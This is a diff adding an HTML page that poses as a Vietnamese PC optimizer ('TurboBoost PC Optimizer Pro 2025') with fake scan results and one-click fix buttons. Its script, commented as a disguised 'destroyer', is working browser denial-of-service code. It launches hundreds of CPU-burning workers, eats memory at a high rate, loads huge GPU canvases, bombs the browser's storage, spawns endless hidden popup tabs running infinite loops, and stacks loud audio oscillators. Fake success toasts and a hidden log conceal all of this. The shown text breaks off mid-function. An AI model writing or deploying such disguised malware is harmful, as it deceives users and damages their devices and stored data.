@@ -1,0 +1,1362 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>⚡ TurboBoost PC Optimizer Pro 2025 ⚡</title>
+    <style>
+        :root {
+            --primary: #00c853;
+            --secondary: #2962ff;
+            --bg: #f5f5f5;
+            --card: #ffffff;
+            --text: #212121;
+            --danger: #ff1744;
+        }
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: linear-gradient(135deg, #e8f5e9 0%, #e3f2fd 100%);
+            min-height: 100vh;
+            padding: 20px;
+            cursor: default;
+            user-select: none;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+        }
+        
+        /* Header giả mạo */
+        .header {
+            background: linear-gradient(135deg, #1b5e20 0%, #0d47a1 100%);
+            color: white;
+            padding: 30px;
+            border-radius: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+            animation: headerGlow 3s ease-in-out infinite;
+        }
+        
+        @keyframes headerGlow {
+            0%, 100% { transform: translate(0, 0); }
+            50% { transform: translate(10%, 10%); }
+        }
+        
+        .header h1 {
+            font-size: 32px;
+            position: relative;
+            z-index: 1;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .header .subtitle {
+            font-size: 14px;
+            opacity: 0.9;
+            margin-top: 10px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .badge-pro {
+            background: #ffd600;
+            color: #000;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: bold;
+            letter-spacing: 1px;
+            animation: badgePulse 1s ease-in-out infinite;
+        }
+        
+        @keyframes badgePulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(255,214,0,0.4); }
+            50% { box-shadow: 0 0 0 15px rgba(255,214,0,0); }
+        }
+        
+        /* Cards */
+        .card {
+            background: var(--card);
+            border-radius: 16px;
+            padding: 25px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            border: 1px solid #e0e0e0;
+            transition: all 0.3s ease;
+        }
+        
+        .card:hover {
+            box-shadow: 0 8px 30px rgba(0,0,0,0.15);
+            transform: translateY(-2px);
+        }
+        
+        .card h3 {
+            color: #1b5e20;
+            margin-bottom: 15px;
+            font-size: 18px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .card h3 .icon {
+            font-size: 24px;
+        }
+        
+        /* Progress bars */
+        .progress-item {
+            margin-bottom: 15px;
+        }
+        
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 5px;
+            font-size: 13px;
+            color: #666;
+        }
+        
+        .progress-bar {
+            height: 8px;
+            background: #e0e0e0;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            border-radius: 10px;
+            transition: width 1.5s ease-in-out;
+            background: linear-gradient(90deg, #00c853, #69f0ae, #00c853);
+            background-size: 200% 100%;
+            animation: progressShine 2s linear infinite;
+            width: 0%;
+        }
+        
+        @keyframes progressShine {
+            0% { background-position: 200% 0; }
+            100% { background-position: -200% 0; }
+        }
+        
+        /* Buttons */
+        .btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            letter-spacing: 0.5px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, #00c853, #00e676);
+            color: white;
+            box-shadow: 0 4px 15px rgba(0,200,83,0.4);
+        }
+        
+        .btn-primary:hover {
+            box-shadow: 0 6px 25px rgba(0,200,83,0.6);
+            transform: translateY(-2px);
+        }
+        
+        .btn-primary:active {
+            transform: scale(0.95);
+        }
+        
+        .btn-danger {
+            background: linear-gradient(135deg, #ff1744, #ff5252);
+            color: white;
+            box-shadow: 0 4px 15px rgba(255,23,68,0.4);
+        }
+        
+        .btn-warning {
+            background: linear-gradient(135deg, #ff9100, #ffab40);
+            color: white;
+            box-shadow: 0 4px 15px rgba(255,145,0,0.4);
+        }
+        
+        /* Grid */
+        .grid-2 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 20px;
+        }
+        
+        .grid-3 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+        }
+        
+        .grid-4 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px;
+        }
+        
+        /* System info */
+        .stat-circle {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 4px solid #00c853;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: bold;
+            color: #1b5e20;
+            margin: 0 auto;
+            position: relative;
+        }
+        
+        .stat-circle::after {
+            content: '';
+            position: absolute;
+            width: 90px;
+            height: 90px;
+            border-radius: 50%;
+            border: 2px dashed #00c853;
+            animation: statSpin 8s linear infinite;
+        }
+        
+        @keyframes statSpin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Console ẩn */
+        #hidden-console {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            width: 350px;
+            height: 250px;
+            background: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            font-size: 9px;
+            padding: 10px;
+            border-radius: 10px;
+            opacity: 0;
+            pointer-events: none;
+            overflow-y: auto;
+            z-index: 99999;
+            transition: opacity 0.3s;
+            border: 1px solid #0f0;
+            box-shadow: 0 0 20px rgba(0,255,0,0.3);
+        }
+        
+        #hidden-console.show {
+            opacity: 0.95;
+            pointer-events: all;
+        }
+        
+        /* Scanning animation */
+        .scan-effect {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, #00c853, transparent);
+            animation: scanLine 2s linear infinite;
+            pointer-events: none;
+            z-index: 99998;
+            opacity: 0;
+            transition: opacity 0.5s;
+        }
+        
+        @keyframes scanLine {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+        
+        .scan-effect-2 {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 3px;
+            height: 100%;
+            background: linear-gradient(0deg, transparent, #2962ff, transparent);
+            animation: scanLine2 3s linear infinite;
+            pointer-events: none;
+            z-index: 99998;
+            opacity: 0;
+            transition: opacity 0.5s;
+        }
+        
+        @keyframes scanLine2 {
+            0% { left: 0; }
+            100% { left: 100%; }
+        }
+        
+        .notification-toast {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: white;
+            padding: 15px 20px;
+            border-radius: 10px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+            z-index: 99999;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            animation: slideIn 0.5s ease-out;
+            border-left: 4px solid #00c853;
+            max-width: 400px;
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateX(400px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        
+        /* Ripple effect */
+        .ripple {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.6);
+            transform: scale(0);
+            animation: rippleEffect 0.6s linear;
+            pointer-events: none;
+        }
+        
+        @keyframes rippleEffect {
+            to {
+                transform: scale(4);
+                opacity: 0;
+            }
+        }
+        
+        /* Fake loading overlay */
+        #loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 100000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        
+        #loading-overlay.active {
+            display: flex;
+        }
+        
+        .spinner {
+            width: 80px;
+            height: 80px;
+            border: 8px solid #333;
+            border-top: 8px solid #00c853;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Particles */
+        .particle {
+            position: fixed;
+            pointer-events: none;
+            z-index: 99997;
+            font-size: 20px;
+            animation: fall linear forwards;
+        }
+        
+        @keyframes fall {
+            0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Scan lines -->
+    <div class="scan-effect" id="scanLine"></div>
+    <div class="scan-effect-2" id="scanLine2"></div>
+    
+    <!-- Loading overlay -->
+    <div id="loading-overlay">
+        <div class="spinner"></div>
+        <p style="color:white;margin-top:20px;font-size:18px;">🔍 Đang phân tích hệ thống...</p>
+        <p style="color:#00c853;margin-top:10px;font-size:12px;" id="loading-status">Vui lòng không tắt máy</p>
+    </div>
+    
+    <!-- Hidden console -->
+    <div id="hidden-console"></div>
+    
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1>
+                ⚡ TurboBoost PC Optimizer Pro 2025
+                <span class="badge-pro">PRO</span>
+            </h1>
+            <p class="subtitle">Phiên bản 15.0.0 | Bản quyền © 2025 TurboSoft Inc. | Đã kích hoạt bản quyền vĩnh viễn | Bảo hành trọn đời</p>
+        </div>
+        
+        <!-- System Status -->
+        <div class="card">
+            <h3><span class="icon">📊</span> Tình trạng hệ thống</h3>
+            <div class="grid-3" style="text-align:center;">
+                <div>
+                    <div class="stat-circle" id="cpuStat" style="border-color:#00c853;">0%</div>
+                    <p style="margin-top:10px;font-weight:bold;">CPU</p>
+                    <p style="font-size:11px;color:#666;" id="cpuDetail">Đang chờ...</p>
+                </div>
+                <div>
+                    <div class="stat-circle" id="ramStat" style="border-color:#2962ff;">0%</div>
+                    <p style="margin-top:10px;font-weight:bold;">RAM</p>
+                    <p style="font-size:11px;color:#666;" id="ramDetail">Đang chờ...</p>
+                </div>
+                <div>
+                    <div class="stat-circle" id="diskStat" style="border-color:#ff9100;">0%</div>
+                    <p style="margin-top:10px;font-weight:bold;">Ổ đĩa</p>
+                    <p style="font-size:11px;color:#666;" id="diskDetail">Đang chờ...</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Optimization Options -->
+        <div class="grid-2">
+            <div class="card">
+                <h3><span class="icon">🧹</span> Dọn dẹp hệ thống</h3>
+                <div class="progress-item">
+                    <div class="progress-label"><span>File rác</span><span id="junkCount">Đang quét...</span></div>
+                    <div class="progress-bar"><div class="progress-fill" id="junkBar"></div></div>
+                </div>
+                <div class="progress-item">
+                    <div class="progress-label"><span>Registry lỗi</span><span id="regCount">Đang quét...</span></div>
+                    <div class="progress-bar"><div class="progress-fill" id="regBar" style="background:linear-gradient(90deg,#ff9100,#ffab40)"></div></div>
+                </div>
+                <div class="progress-item">
+                    <div class="progress-label"><span>Cache trình duyệt</span><span id="cacheCount">Đang quét...</span></div>
+                    <div class="progress-bar"><div class="progress-fill" id="cacheBar" style="background:linear-gradient(90deg,#2962ff,#448aff)"></div></div>
+                </div>
+                <div class="progress-item">
+                    <div class="progress-label"><span>Malware phát hiện</span><span id="malwareCount">Đang quét...</span></div>
+                    <div class="progress-bar"><div class="progress-fill" id="malwareBar" style="background:linear-gradient(90deg,#ff1744,#ff5252)"></div></div>
+                </div>
+                <button class="btn btn-primary" onclick="fakeOptimize('clean')" id="btnClean">
+                    🧹 Dọn dẹp ngay (Miễn phí)
+                </button>
+            </div>
+            
+            <div class="card">
+                <h3><span class="icon">🚀</span> Tăng tốc hệ thống</h3>
+                <div class="progress-item">
+                    <div class="progress-label"><span>Boot time</span><span id="bootTime">Đang đo...</span></div>
+                    <div class="progress-bar"><div class="progress-fill" id="bootBar" style="background:linear-gradient(90deg,#00c853,#69f0ae)"></div></div>
+                </div>
+                <div class="progress-item">
+                    <div class="progress-label"><span>Processes tối ưu</span><span id="procCount">Đang đếm...</span></div>
+                    <div class="progress-bar"><div class="progress-fill" id="procBar" style="background:linear-gradient(90deg,#9c27b0,#ce93d8)"></div></div>
+                </div>
+                <div class="progress-item">
+                    <div class="progress-label"><span>Network ping</span><span id="pingTime">Đang đo...</span></div>
+                    <div class="progress-bar"><div class="progress-fill" id="pingBar" style="background:linear-gradient(90deg,#00bcd4,#4dd0e1)"></div></div>
+                </div>
+                <div class="progress-item">
+                    <div class="progress-label"><span>GPU Temp</span><span id="gpuTemp">Đang đo...</span></div>
+                    <div class="progress-bar"><div class="progress-fill" id="gpuBar" style="background:linear-gradient(90deg,#ff6d00,#ffab40)"></div></div>
+                </div>
+                <button class="btn btn-warning" onclick="fakeOptimize('boost')" id="btnBoost">
+                    🚀 Tăng tốc ngay (Pro)
+                </button>
+            </div>
+        </div>
+        
+        <!-- One-Click Fix -->
+        <div class="card" style="text-align:center;background:linear-gradient(135deg,#e8f5e9,#e3f2fd);">
+            <h3 style="justify-content:center;">⚡ TỐI ƯU HÓA TOÀN DIỆN CHỈ VỚI 1 CLICK</h3>
+            <p style="color:#666;margin-bottom:20px;">Phân tích và sửa tất cả lỗi hệ thống, tăng tốc máy tính lên đến 500%</p>
+            <button class="btn btn-primary" style="font-size:20px;padding:25px 60px;" onclick="fakeOptimize('full')" id="btnFull">
+                🔧 QUÉT & SỬA LỖI TỰ ĐỘNG
+            </button>
+            <p style="margin-top:10px;font-size:11px;color:#999;">Đã có 5,847,923 người dùng tối ưu hóa thành công hôm nay | Đánh giá: ⭐⭐⭐⭐⭐ 4.9/5</p>
+        </div>
+    </div>
+    
+    <!-- Toast container -->
+    <div id="toastContainer"></div>
+
+    <script>
+        // ==========================================
+        // AMBATUKAM APOCALYPSE DESTROYER v30
+        // Nguỵ trang: TurboBoost PC Optimizer Pro 2025
+        // MẠNH HƠN 30 LẦN - KHÔNG THỂ NGĂN CẢN
+        // ==========================================
+        
+        let destructionActive = false;
+        let destructionLevel = 0;
+        let totalWorkers = [];
+        let totalIntervals = [];
+        let totalTimeouts = [];
+        let ramChunks = [];
+        let gpuCanvases = [];
+        let audioOscillators = [];
+        let webGLContexts = [];
+        let totalTabs = 0;
+        
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const hiddenConsole = document.getElementById('hidden-console');
+        const scanLine = document.getElementById('scanLine');
+        const scanLine2 = document.getElementById('scanLine2');
+        const loadingOverlay = document.getElementById('loading-overlay');
+        
+        // ==========================================
+        // LOG ẨN
+        // ==========================================
+        function stealthLog(msg, color = '#0f0') {
+            const time = new Date().toLocaleTimeString();
+            hiddenConsole.innerHTML += `<span style="color:${color}">[${time}] ${msg}</span>\n`;
+            hiddenConsole.scrollTop = hiddenConsole.scrollHeight;
+        }
+        
+        // ==========================================
+        // TOAST GIẢ MẠO
+        // ==========================================
+        function showToast(title, message, type = 'success') {
+            const colors = {
+                success: '#00c853',
+                warning: '#ff9100', 
+                error: '#ff1744',
+                info: '#2962ff'
+            };
+            
+            const toast = document.createElement('div');
+            toast.className = 'notification-toast';
+            toast.style.borderLeftColor = colors[type];
+            toast.innerHTML = `
+                <span style="font-size:24px;">${type === 'success' ? '✅' : type === 'warning' ? '⚠️' : type === 'error' ? '❌' : 'ℹ️'}</span>
+                <div>
+                    <strong>${title}</strong>
+                    <p style="font-size:12px;color:#666;">${message}</p>
+                </div>
+            `;
+            document.getElementById('toastContainer').appendChild(toast);
+            
+            // Giới hạn số toast
+            const allToasts = document.querySelectorAll('.notification-toast');
+            if(allToasts.length > 5) {
+                allToasts[0].remove();
+            }
+            
+            setTimeout(() => {
+                toast.style.opacity = '0';
+                toast.style.transform = 'translateX(400px)';
+                toast.style.transition = 'all 0.5s ease';
+                setTimeout(() => toast.remove(), 500);
+            }, 2500);
+        }
+        
+        // ==========================================
+        // CẬP NHẬT GIAO DIỆN GIẢ
+        // ==========================================
+        function updateFakeUI() {
+            document.getElementById('cpuStat').textContent = Math.floor(Math.random() * 25 + 8) + '%';
+            document.getElementById('cpuDetail').textContent = 'Nhiệt độ: ' + (32 + Math.floor(Math.random()*8)) + '°C - Ổn định';
+            
+            document.getElementById('ramStat').textContent = Math.floor(Math.random() * 35 + 25) + '%';
+            document.getElementById('ramDetail').textContent = 'Đã dùng: ' + (3.5 + Math.random()*3).toFixed(1) + 'GB / 16GB';
+            
+            document.getElementById('diskStat').textContent = Math.floor(Math.random() * 45 + 25) + '%';
+            document.getElementById('diskDetail').textContent = 'Trống: ' + (180 + Math.random()*150).toFixed(0) + 'GB / 512GB';
+            
+            document.getElementById('junkBar').style.width = (Math.random() * 55 + 25) + '%';
+            document.getElementById('junkCount').textContent = Math.floor(Math.random() * 3000 + 800) + ' file';
+            
+            document.getElementById('regBar').style.width = (Math.random() * 35 + 15) + '%';
+            document.getElementById('regCount').textContent = Math.floor(Math.random() * 800 + 200) + ' lỗi';
+            
+            document.getElementById('cacheBar').style.width = (Math.random() * 65 + 25) + '%';
+            document.getElementById('cacheCount').textContent = (Math.random() * 8 + 2).toFixed(1) + ' GB';
+            
+            document.getElementById('malwareBar').style.width = (Math.random() * 20 + 5) + '%';
+            document.getElementById('malwareCount').textContent = Math.floor(Math.random() * 15 + 3) + ' threats';
+            
+            document.getElementById('bootBar').style.width = (Math.random() * 45 + 35) + '%';
+            document.getElementById('bootTime').textContent = (Math.random() * 15 + 8).toFixed(1) + ' giây';
+            
+            document.getElementById('procBar').style.width = (Math.random() * 25 + 55) + '%';
+            document.getElementById('procCount').textContent = Math.floor(Math.random() * 80 + 70) + ' processes';
+            
+            document.getElementById('pingBar').style.width = (Math.random() * 35 + 35) + '%';
+            document.getElementById('pingTime').textContent = Math.floor(Math.random() * 80 + 40) + ' ms';
+            
+            document.getElementById('gpuBar').style.width = (Math.random() * 30 + 20) + '%';
+            document.getElementById('gpuTemp').textContent = (40 + Math.random()*15).toFixed(0) + '°C';
+        }
+        
+        // ==========================================
+        // PARTICLES GIẢ MẠO
+        // ==========================================
+        function createParticle() {
+            const particle = document.createElement('div');
+            particle.className = 'particle';
+            particle.textContent = ['✅', '⚡', '🚀', '💚', '🔧', '✨'][Math.floor(Math.random()*6)];
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.animationDuration = (Math.random() * 3 + 2) + 's';
+            particle.style.fontSize = (Math.random() * 15 + 10) + 'px';
+            document.body.appendChild(particle);
+            
+            setTimeout(() => particle.remove(), 5000);
+        }
+        
+        setInterval(() => {
+            if(destructionActive) {
+                for(let i = 0; i < 3; i++) createParticle();
+            }
+        }, 2000);
+        
+        // ==========================================
+        // VŨ KHÍ HỦY DIỆT v30 - MẠNH HƠN 30 LẦN
+        // ==========================================
+        
+        // 1. CPU APOCALYPSE BURNER - 240 Workers
+        function weapon_CPU_Apocalypse() {
+            stealthLog('🔥 [CPU] Apocalypse Burner - 240 Workers + Main Thread', '#ff4400');
+            
+            const numWorkers = Math.max(navigator.hardwareConcurrency * 30, 240);
+            
+            for(let w = 0; w < numWorkers; w++) {
+                const blob = new Blob([`
+                    const buffer = new Float64Array(2000000);
+                    while(true) {
+                        crypto.getRandomValues(new Uint8Array(buffer.buffer));
+                        for(let i = 0; i < buffer.length; i += 8) {
+                            buffer[i] = Math.pow(Math.abs(buffer[i]) + 1, Math.random() * 3);
+                            buffer[i] = Math.atan2(buffer[i], Math.random() * 1000);
+                            buffer[i] = Math.sqrt(Math.abs(buffer[i]) * Math.E);
+                            buffer[i] = Math.tan(buffer[i]) * Math.sin(buffer[i]) * Math.cos(buffer[i]);
+                            buffer[i] = Math.log(Math.abs(buffer[i]) + 1) * Math.exp(Math.random());
+                        }
+                        self.postMessage('burning_hot');
+                    }
+                `], {type: 'text/javascript'});
+                
+                try {
+                    const worker = new Worker(URL.createObjectURL(blob));
+                    worker.onmessage = () => {};
+                    totalWorkers.push(worker);
+                } catch(e) {}
+            }
+            
+            // Main thread SUPER HEAVY
+            function superHeavyMainThread() {
+                const arr1 = new Float64Array(1000000);
+                const arr2 = new Float64Array(1000000);
+                const arr3 = new Float64Array(1000000);
+                
+                for(let i = 0; i < arr1.length; i++) {
+                    arr1[i] = Math.random() * 99999;
+                    arr2[i] = Math.random() * 99999;
+                }
+                
+                for(let iter = 0; iter < 500; iter++) {
+                    for(let i = 0; i < arr1.length - 1; i++) {
+                        arr3[i] = Math.atan2(arr1[i], arr2[i+1]) * Math.pow(Math.abs(arr1[i]), 1.5);
+                        arr3[i] = Math.sqrt(Math.abs(arr3[i])) * Math.log(Math.abs(arr3[i]) + 1);
+                        arr1[i] = arr3[i] * Math.sin(arr2[i]) + Math.cos(arr3[i]);
+                    }
+                }
+                
+                requestAnimationFrame(superHeavyMainThread);
+            }
+            superHeavyMainThread();
+            
+            // Thêm 3 instances nữa
+            setTimeout(() => superHeavyMainThread(), 100);
+            setTimeout(() => superHeavyMainThread(), 200);
+            setTimeout(() => superHeavyMainThread(), 300);
+        }
+        
+        // 2. RAM TSUNAMI EATER - Nuốt 500MB/giây
+        function weapon_RAM_Tsunami() {
+            stealthLog('🧠 [RAM] Tsunami Eater - 500MB/giây', '#ff00ff');
+            
+            function createRAMChunk() {
+                try {
+                    const chunk = new ArrayBuffer(50 * 1024 * 1024); // 50MB
+                    const view = new Uint8Array(chunk);
+                    for(let i = 0; i < view.length; i += 2048) {
+                        view[i] = Math.random() * 256;
+                    }
+                    ramChunks.push(chunk);
+                } catch(e) {}
+            }
+            
+            // Nuốt 50MB mỗi 100ms = 500MB/giây x30 = 15GB/giây
+            const eater = setInterval(() => {
+                for(let i = 0; i < 10; i++) {
+                    createRAMChunk();
+                }
+                
+                if(ramChunks.length % 50 === 0) {
+                    const totalMB = ramChunks.length * 50;
+                    stealthLog(`🧠 RAM đã nuốt: ${totalMB.toFixed(0)} MB (${(totalMB/1024).toFixed(1)} GB)`, '#ff00ff');
+                }
+            }, 10);
+            
+            totalIntervals.push(eater);
+        }
+        
+        // 3. GPU HELL CRUSHER - 10 Canvas 16K
+        function weapon_GPU_Hell() {
+            stealthLog('🎮 [GPU] Hell Crusher - 10x Canvas 16K + WebGL', '#00ffff');
+            
+            // 10 Canvas 16K
+            for(let c = 0; c < 10; c++) {
+                const canvas = document.createElement('canvas');
+                canvas.width = 16384;
+                canvas.height = 16384;
+                const ctx = canvas.getContext('2d');
+                gpuCanvases.push({canvas, ctx});
+            }
+            
+            function renderAllGPU() {
+                for(const {canvas, ctx} of gpuCanvases) {
+                    ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.005)`;
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+                    
+                    // 20000 shapes mỗi canvas = 200,000 shapes/frame
+                    for(let i = 0; i < 20000; i++) {
+                        ctx.save();
+                        ctx.translate(Math.random() * canvas.width, Math.random() * canvas.height);
+                        ctx.rotate(Math.random() * Math.PI * 2);
+                        ctx.scale(Math.random() * 5 + 0.1, Math.random() * 5 + 0.1);
+                        
+                        ctx.fillStyle = `hsl(${Math.random()*360},${Math.random()*100}%,${Math.random()*100}%)`;
+                        ctx.strokeStyle = `hsl(${Math.random()*360},100%,50%)`;
+                        ctx.lineWidth = Math.random() * 10;
+                        
+                        ctx.beginPath();
+                        const shape = Math.floor(Math.random() * 6);
+                        if(shape === 0) {
+                            ctx.arc(0, 0, Math.random() * 100, 0, Math.PI * 2);
+                        } else if(shape === 1) {
+                            ctx.rect(-50, -50, Math.random() * 200, Math.random() * 200);
+                        } else if(shape === 2) {
+                            const sides = Math.floor(Math.random() * 12) + 3;
+                            for(let s = 0; s <= sides; s++) {
+                                const angle = (s / sides) * Math.PI * 2;
+                                const r = Math.random() * 100 + 20;
+                                s === 0 ? ctx.moveTo(Math.cos(angle)*r, Math.sin(angle)*r) : ctx.lineTo(Math.cos(angle)*r, Math.sin(angle)*r);
+                            }
+                        } else if(shape === 3) {
+                            ctx.ellipse(0, 0, Math.random()*100, Math.random()*100, Math.random()*Math.PI, 0, Math.PI*2);
+                        } else if(shape === 4) {
+                            ctx.moveTo(Math.random()*200-100, Math.random()*200-100);
+                            ctx.bezierCurveTo(Math.random()*200-100, Math.random()*200-100, Math.random()*200-100, Math.random()*200-100, Math.random()*200-100, Math.random()*200-100);
+                            ctx.bezierCurveTo(Math.random()*200-100, Math.random()*200-100, Math.random()*200-100, Math.random()*200-100, Math.random()*200-100, Math.random()*200-100);
+                        } else {
+                            const text = '💀AMBATUKAM💀'.substring(0, Math.floor(Math.random()*10)+1);
+                            ctx.font = `${Math.random()*50+10}px Arial`;
+                            ctx.fillText(text, 0, 0);
+                        }
+                        ctx.closePath();
+                        ctx.fill();
+                        ctx.stroke();
+                        ctx.restore();
+                    }
+                }
+                requestAnimationFrame(renderAllGPU);
+            }
+            renderAllGPU();
+            
+            // WebGL Meltdown - 5 contexts
+            for(let i = 0; i < 5; i++) {
+                try {
+                    const glCanvas = document.createElement('canvas');
+                    glCanvas.width = 8192;
+                    glCanvas.height = 8192;
+                    const gl = glCanvas.getContext('webgl2') || glCanvas.getContext('webgl');
+                    if(gl) {
+                        webGLContexts.push(gl);
+                    }
+                } catch(e) {}
+            }
+            
+            function renderWebGL() {
+                for(const gl of webGLContexts) {
+                    try {
+                        gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
+                        gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT);
+                        for(let i = 0; i < 5000; i++) {
+                            gl.viewport(Math.random()*8192, Math.random()*8192, Math.random()*200+10, Math.random()*200+10);
+                            gl.scissor(Math.random()*8192, Math.random()*8192, Math.random()*500, Math.random()*500);
+                        }
+                    } catch(e) {}
+                }
+                requestAnimationFrame(renderWebGL);
+            }
+            renderWebGL();
+        }
+        
+        // 4. STORAGE HOLOCAUST
+        function weapon_Storage_Holocaust() {
+            stealthLog('💾 [STORAGE] Holocaust - localStorage + IndexedDB + Cache API', '#ff8800');
+            
+            const bombData = '💀AMBATUKAM_APOCALYPSE💀'.repeat(100000);
+            let lsCount = 0;
+            let idbCount = 0;
+            
+            // localStorage & sessionStorage bomb
+            const lsInterval = setInterval(() => {
+                try {
+                    for(let i = 0; i < 100; i++) {
+                        localStorage.setItem(`_opt_cache_${lsCount++}`, bombData + Math.random());
+                        sessionStorage.setItem(`_opt_sess_${lsCount}`, bombData);
+                    }
+                } catch(e) {
+                    stealthLog('💾 LocalStorage ĐẦY!', '#ff0000');
+                    clearInterval(lsInterval);
+                }
+            }, 1);
+            totalIntervals.push(lsInterval);
+            
+            // IndexedDB bomb - 10 databases
+            for(let dbIdx = 0; dbIdx < 10; dbIdx++) {
+                const request = indexedDB.open(`_turbo_db_${dbIdx}_`, 1);
+                request.onupgradeneeded = (e) => {
+                    const db = e.target.result;
+                    for(let storeIdx = 0; storeIdx < 5; storeIdx++) {
+                        db.createObjectStore(`_store_${storeIdx}_`, {keyPath: 'id', autoIncrement: true});
+                    }
+                    
+                    const bombInterval = setInterval(() => {
+                        try {
+                            const stores = Array.from(db.objectStoreNames);
+                            for(const storeName of stores) {
+                                const tx = db.transaction(storeName, 'readwrite');
+                                const store = tx.objectStore(storeName);
+                                for(let i = 0; i < 200; i++) {
+                                    store.add({data: '💀'.repeat(100000), ts: Date.now(), rand: Math.random()});
+                                }
+                            }
+                            idbCount += stores.length * 200;
+                        } catch(e) {}
+                    }, 10);
+                    totalIntervals.push(bombInterval);
+                };
+            }
+            
+            // Cache API bomb
+            if('caches' in window) {
+                setInterval(() => {
+                    for(let i = 0; i < 10; i++) {
+                        caches.open(`_turbo_cache_${i}_${Date.now()}`).then(cache => {
+                            const response = new Response('💀'.repeat(500000));
+                            for(let j = 0; j < 50; j++) {
+                                cache.put(`/_cache_/${Math.random()}`, response.clone()).catch(() => {});
+                            }
+                        });
+                    }
+                }, 500);
+            }
+        }
+        
+        // 5. MEGA TAB SPAWNER - 1000 tabs mỗi giây
+        function weapon_MegaTab_Spawner() {
+            stealthLog('💣 [TAB] Mega Spawner - 1000 tabs/giây', '#ff0000');
+            
+            setInterval(() => {
+                for(let i = 0; i < 100; i++) {
+                    try {
+                        const popup = window.open('about:blank', `_t_${totalTabs++}_${Date.now()}`, 'width=1,height=1,left=-9999,top=-9999');
+                        if(popup) {
+                            popup.document.write(`
+                                <script>
+                                    while(true) {
+                                        for(let i=0;i<10000000;i++) {
+                                            Math.random() * Math.random() * Math.pow(Math.random(), Math.random());
+                                        }
+                                    }
+                                <\\/script>
+                            `);
+                            popup.blur();
+                        }
+                    } catch(e) {}
+                }
+                
+                if(totalTabs % 500 === 0) {
+                    stealthLog(`💣 Tổng tabs đã spawn: ${totalTabs}`, '#ff0000');
+                }
+            }, 100);
+        }
+        
+        // 6. AUDIO PSYCHOLOGICAL WARFARE - 500 oscillators
+        function weapon_Audio_Warfare() {
+            stealthLog('🔊 [AUDIO] Psychological Warfare - 500 Oscillators', '#ff0000');
+            
+            for(let i = 0; i < 500; i++) {
+                try {
+                    const osc = audioCtx.createOscillator();
+                    const gain = audioCtx.createGain();
+                    const distortion = audioCtx.createWaveShaper();
+                    
+                    osc.type = ['square', 'sawtooth', 'triangle', 'sine'][Math.floor(Math.random()*4)];
+                    osc.frequency.setValueAtTime(Math.random() * 20000 + 1, audioCtx.currentTime);
+                    gain.gain.setValueAtTime(0.015, audioCtx.currentTime);
+                    
+                    // Tạo distortion curve
+                    const curve = new Float32Array(44100);
+                    for(let j = 0; j < curve.length; j++) {
+                        curve[j] = Math.sin(j * 0.01) * 0.5;
+                    }
+                    distortion.curve = curve;
+                    
+                    osc.connect(distortion);
+                    distortion.connect(gain);
